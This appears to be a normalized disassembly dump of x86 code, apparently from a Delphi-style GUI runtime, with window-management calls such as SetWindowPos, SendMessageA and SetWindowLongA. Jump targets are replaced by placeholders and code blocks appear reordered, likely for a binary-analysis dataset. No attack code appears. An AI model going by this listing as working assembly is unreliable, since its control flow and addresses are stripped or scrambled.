push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45aa40
jmp r-xdata
sub_45ca3d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46040c
call sub_403974
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b790
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443924
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_446450
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb38
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_446450
call sub_4572fc
mov ebx eax
sub_45cb84
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45cbdc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421838
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45cc3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45cc48
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403368
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45cc74
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4603f8
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403368
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45ce14
jmp r-xdata
mov eax ebx
call sub_45ceb0
mov dl 0x1
mov eax ebx
call sub_45aa00
jmp r-xdata
sub_45cd18
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_45a38c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_45a3d8
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45cd7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45cde8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403368
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ceb0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45ce34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45cea2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cea9
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45b68c
sub_45cecc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d194
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43e410
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45f36c
xor edx edx
push ebp
push sub_45d177
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_417f10
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45e39c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_4571ac
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45d155
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45ce1c
xor edx edx
push ebp
push sub_45d0b4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cd7c
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_460178
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_446450
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d0bb
mov eax [ ebp - 0x4 ]
call sub_45ce14
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45d0bb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d15f
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e39c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45e39c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_417e8c
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_418030
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_457260
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45d1a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d1a4
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45d214
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45d1a4
pop ecx
mov eax [ esi + 0x34 ]
call sub_451cc0
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_451cd0
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45d298
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44471c
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403368
sub_45d2bc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403368
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45d2ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d2bc
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d2ec
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d368
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45d2bc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45d2bc
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45d2ec
pop ecx
test al al
je r-xdata
sub_45d3bc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403368
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45d3ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d3bc
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45d3ec
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d468
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45d3bc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45d3bc
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45d3ec
pop ecx
test al al
je r-xdata
sub_45d4bc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_417e94
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44bef0
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45d510
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45d4bc
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403368
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d58c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41ee68
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45d5c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_440094
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_440d98
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45d610
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_446450
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_446450
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_446450
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_446450
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_446450
push eax
call RedrawWindow
sub_45d764
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_45841c
mov dl 0x5
mov eax ebx
call sub_45a288
mov dl 0x1
mov eax ebx
call sub_44502c
mov dl 0x3
mov eax ebx
call sub_45a584
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_45d7cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45d8a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_444eec
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_444d58
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43f0c4
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fb24
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404030
mov eax [ ebp - 0xc ]
call sub_404200
push eax
mov eax [ ebp - 0xc ]
call sub_404400
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43fb34
mov eax [ ebp - 0xc ]
call sub_404200
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d8aa
lea eax [ ebp - 0xc ]
call sub_403f40
retn
mov dl 0x1
mov eax esi
call sub_459908
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43fbe0
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_40458c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45d8d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4430fc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_45902c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_4430c0
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403368
inc ebp
dec edi
jne r-xdata
sub_45d91c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_444eec
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45d948
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4456f4
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45d970
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45bcd8
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446450
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_444eec
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446450
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_446450
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_444f00
or ecx 0xffffffff
mov dl 0x1
call sub_440258
pop esi
pop ebx
retn
sub_45da08
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_445b64
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_440d98
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43f550
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403368
sub_45da60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45db26
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43fb24
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404030
mov eax [ ebp - 0x4 ]
call sub_404200
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43fb34
mov eax [ ebp - 0x4 ]
call sub_404200
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43fbe0
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45db2d
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_459908
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_40458c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45db4c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4458e4
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_444eec
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_444f00
mov dl [ ebx + 0x57 ]
call sub_43fad0
inc edi
dec esi
jne r-xdata
sub_45dbf0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45dc20
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45dc50
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e6d8
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45dff4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45e000
mov eax ebx
call sub_45e00c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
